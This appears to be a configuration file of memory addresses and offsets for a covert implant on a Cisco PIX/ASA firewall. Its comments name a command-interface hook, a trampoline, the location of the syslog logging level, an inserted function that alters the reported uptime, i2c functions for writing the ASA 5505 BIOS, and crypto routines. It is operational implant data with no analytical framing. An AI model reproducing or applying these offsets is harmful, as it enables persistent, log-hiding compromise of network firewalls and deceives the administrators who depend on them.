; --- SECTION I ---
;
0x10072400            // pix version
0x81e000              // address of implant configuration
DevIoctlOffset            0x70            // offset to ioctl function in device table
DuartTtyAddr              0x01168998      // addr of duart/0 tty entry
CIStartFunc               0x001609b0      // addr of the command interface start function -- telnet function
CommandListAddr           0x012355a0      // addr of the command list -- first parameter of ci
DeviceListPtrAddr         0x01346aa0      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset       0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr            0x010c6c88      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr         0x014ec718      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue               0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue              0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue               0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset               0xb0            // Offset into a thread struct containing the stdch pointer
StdErrOffset              0xb4            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset            0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset               0x14            // offset into an environment struct containing the username 
EnvPtrOffset              0xbc            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset              0x00000a38      // offset into the syslog structure where the logging level is stored
Open                      0x00118d00      // open
ChannelConfigOffset       0x08            // offset into a channel where the configuration pointer is
InputModeOffset           0x08            // offset into a duart config structure where the input mode is stored
InputModeEsc              0x20            // Input mode used for entering escape sequence
WatchDogTimeout           0x01140f90      // Address where the thread timeout value is stored 
UpTimeCounter             0x01417e60      // Address of the up time counter
Display_uptime_addr       0x001697c0      // Address of the function that display the uptime
Inserted_code_addr        0x0017cb03      // Address of the our insterted function to add time to the uptime
i2cReadByte               0x010cb8e8      // read byte function needed to operate on the bios of the asa 5505
i2cWriteByte              0x010cb738      // write byte function needed to operate on the bios of the asa 5505
CLIHookAddress            0x00160e7f      // Address of hook into the command interface
AvailMemoryPtr            0x01418c60      // Address of total available memory
;
srand               0x010c28c8
BN_new              0x010075b8
BN_free             0x01007518
BN_mod_exp          0x01040458
BN_CTX_new          0x01008a98
BN_CTX_free         0x01008b18
BN_bin2bn           0x01007c28
BN_bn2bin           0x01007d48
BN_bn2hex           0x0104d208
BN_num_bits         0x01007468
DH_p                0x01155e30
aesEncrypt          0x00186810
aesKeySet           0x00182d90
slimHookAddr        0x004e29f0
slimTrampoline      0x004fd8bb
HookByte1           0x01
HookBytes2to5       0x344b89c1
codepageBase        0x014186c0
codeSectionStart    0x00100000
codeSectionEnd      0x0113fa70
;
; --- END OF SECTION II ---
;
:EOS:
;
